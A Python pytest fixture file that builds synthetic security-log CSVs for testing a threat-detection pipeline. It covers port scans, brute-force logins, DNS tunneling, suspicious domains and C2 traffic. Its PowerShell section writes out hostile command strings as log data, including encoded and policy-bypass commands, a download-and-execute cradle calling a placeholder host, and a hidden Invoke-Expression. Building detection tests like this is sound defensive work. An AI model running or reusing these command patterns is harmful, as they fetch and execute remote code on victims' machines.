"""Test fixtures: synthetic CSVs shaped like the real dataset in miniature.

Deterministic (no randomness) so runs are reproducible. Includes every campaign
plus the background failed-login noise that the precision test depends on.
"""

from __future__ import annotations

import csv
import string
from pathlib import Path

import pytest

HEADER = [
    "log_id", "timestamp", "source_ip", "destination_ip", "source_port",
    "destination_port", "protocol", "service", "username", "event_type",
    "event_status", "domain", "command", "bytes_sent", "bytes_received", "severity",
]

_ALPHABET = string.ascii_lowercase + string.digits


def _rand_label(i: int, n: int = 54) -> str:
    """Deterministic high-entropy label of length n."""
    out = []
    x = (i * 2654435761 + 1) & 0xFFFFFFFF
    for _ in range(n):
        x = (x * 1103515245 + 12345) & 0x7FFFFFFF
        out.append(_ALPHABET[x % len(_ALPHABET)])
    return "".join(out)


def _row(log_id: int, ts_sec: int, **kw: object) -> dict[str, object]:
    hh, mm, ss = ts_sec // 3600 % 24, ts_sec // 60 % 60, ts_sec % 60
    base: dict[str, object] = {
        "log_id": f"L{log_id:07d}",
        "timestamp": f"2026-07-01 {hh:02d}:{mm:02d}:{ss:02d}",
        "source_ip": "10.0.0.1",
        "destination_ip": "10.0.0.2",
        "source_port": 40000 + (log_id % 20000),
        "destination_port": 443,
        "protocol": "TCP",
        "service": "HTTP",
        "username": "",
        "event_type": "NETWORK_CONNECTION",
        "event_status": "SUCCESS",
        "domain": "",
        "command": "",
        "bytes_sent": 1000,
        "bytes_received": 2000,
        "severity": "LOW",
    }
    base.update(kw)
    return base


def build_dataset() -> list[dict[str, object]]:
    rows: list[dict[str, object]] = []
    lid = 0
    t = 0

    # Distributed port scan: 60 sources in 203.0.x -> 172.16.10.25, 25 ports, blocked.
    for i in range(60):
        lid += 1
        t += 7
        rows.append(_row(
            lid, t, source_ip=f"203.0.{i // 256}.{i % 256}",
            destination_ip="172.16.10.25", destination_port=20 + (i % 25),
            protocol="TCP", service="UNKNOWN", event_type="PORT_SCAN",
            event_status="BLOCKED", bytes_sent=80, bytes_received=0, severity="HIGH",
        ))

    # Distributed brute force: 60 sources in 185.199.x -> 10.10.20.15, SSH + RDP, FAILED.
    users = ["support", "admin", "administrator"]
    for i in range(60):
        lid += 1
        t += 11
        port, svc = (22, "SSH") if i % 2 == 0 else (3389, "RDP")
        rows.append(_row(
            lid, t, source_ip=f"185.199.{i // 256}.{i % 256}",
            destination_ip="10.10.20.15", destination_port=port, protocol="TCP",
            service=svc, username=users[i % 3], event_type="FAILED_LOGIN_BURST",
            event_status="FAILED", severity="HIGH",
        ))

    # Background failed logins: many hosts, few sources each (must NOT fire brute).
    for h in range(40):
        for s in range(3):
            lid += 1
            t += 3
            rows.append(_row(
                lid, t, source_ip=f"172.31.{h}.{s}",
                destination_ip=f"192.168.10.{h}", destination_port=22, service="SSH",
                username="jdoe", event_type="LOGIN", event_status="FAILED",
            ))
    # One benign host near the real benign ceiling (28 sources) - still below threshold.
    for s in range(28):
        lid += 1
        t += 3
        rows.append(_row(
            lid, t, source_ip=f"172.20.0.{s}", destination_ip="192.168.10.200",
            destination_port=3389, service="RDP", username="ops",
            event_type="LOGIN", event_status="FAILED",
        ))

    # DNS tunneling: 10 unique high-entropy subdomains under one parent.
    for i in range(10):
        lid += 1
        t += 5
        rows.append(_row(
            lid, t, source_ip="192.168.10.83",
            destination_port=53, protocol="UDP", service="DNS",
            domain=f"{_rand_label(i)}.data-transfer.example",
            event_type="DNS_TUNNELING", event_status="ALLOWED", severity="CRITICAL",
        ))

    # Suspicious domains: the six IOCs.
    for i, dom in enumerate([
        "powershell-download.site", "freevpn-access.click", "login-security-check.info",
        "remote-admin-panel.ru", "secure-update-check.xyz", "cdn-account-verify.top",
    ]):
        for _ in range(3):
            lid += 1
            t += 4
            rows.append(_row(
                lid, t, source_ip=f"192.168.10.{50 + i}", destination_port=53,
                protocol="UDP", service="DNS", domain=dom,
                event_type="SUSPICIOUS_DNS", event_status="ALLOWED", severity="MEDIUM",
            ))

    # Malicious PowerShell: four families from four hosts.
    for i, cmd in enumerate([
        "powershell.exe -enc BASE64_PAYLOAD",
        "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAF==",
        "powershell.exe (New-Object Net.WebClient).DownloadString('http://x')",
        "powershell.exe -WindowStyle Hidden Invoke-Expression $cmd",
    ]):
        lid += 1
        t += 6
        rows.append(_row(
            lid, t, source_ip=f"192.168.10.{80 + i}", service="POWERSHELL",
            command=cmd, event_type="SUSPICIOUS_POWERSHELL", event_status="SUCCESS",
            severity="CRITICAL",
        ))

    # C2 port 4444 (unlabelled in the real data -> NETWORK_CONNECTION here).
    for i in range(5):
        lid += 1
        t += 8
        rows.append(_row(
            lid, t, source_ip=f"192.168.10.{90 + i}", destination_ip="45.33.32.10",
            destination_port=4444, service="UNKNOWN", event_type="NETWORK_CONNECTION",
        ))

    # Benign noise: normal traffic and a benign PowerShell / DNS.
    for i in range(30):
        lid += 1
        t += 2
        rows.append(_row(lid, t, source_ip=f"192.168.10.{i}", domain="github.com",
                         service="DNS", destination_port=53, event_type="DNS_QUERY"))
    lid += 1
    rows.append(_row(lid, t, source_ip="192.168.10.5", service="POWERSHELL",
                     command="Get-Process", event_type="POWERSHELL"))
    return rows


def write_csv(path: Path, rows: list[dict[str, object]]) -> Path:
    with open(path, "w", encoding="utf-8", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=HEADER)
        writer.writeheader()
        writer.writerows(rows)
    return path


@pytest.fixture
def dataset_csv(tmp_path: Path) -> Path:
    return write_csv(tmp_path / "logs.csv", build_dataset())


@pytest.fixture
def sample_report(dataset_csv: Path) -> dict:
    """A real report from the real pipeline.

    Built rather than hand-written on purpose: the render contract tests compare
    this against the SPA's TypeScript types, so a hand-maintained dict would only
    ever prove that the dict matches the types, not that the tool does.
    """
    from eventiq.server import analyse_to_report

    repo = Path(__file__).resolve().parents[1]
    return analyse_to_report(str(dataset_csv), str(repo / "config" / "default.yml"))
